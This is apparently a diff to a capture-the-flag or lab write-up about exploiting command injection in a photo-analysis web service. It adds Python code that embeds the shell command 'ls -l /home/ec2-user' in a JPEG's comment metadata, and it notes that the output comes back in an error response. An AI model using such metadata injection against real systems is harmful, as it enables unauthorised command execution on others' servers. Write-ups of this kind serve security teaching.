@@ -22,7 +22,19 @@ The given library is quite small, and the obvious vulnerability pops right up - 
 
 so it seems like all we need to do is to insert there the command we want to be preformed. 
 
-we use PIL to generate an image and insert a command into its metadata - 'ls -l' and then when uploading to the website, we get an error for analyze-photo, but in the response we get the output of the command we sent. 
+we use PIL to generate an image and insert a command into its metadata - 'ls -l /home/ec2-user' :
+
+```
+from PIL import Image, JpegImagePlugin
+
+image = Image.new('RGB', (100, 100), color=(73, 109, 137))
+
+metadata_comment = 'ls -l /home/ec2-user'
+
+image.save('vulnerable_image.jpeg', "JPEG", quality=95, comment=metadata_comment)
+```
+
+then when uploading to the website, we get an error for analyze-photo, but in the response we get the output of the command we sent. 
 
 the output we got is - 
 
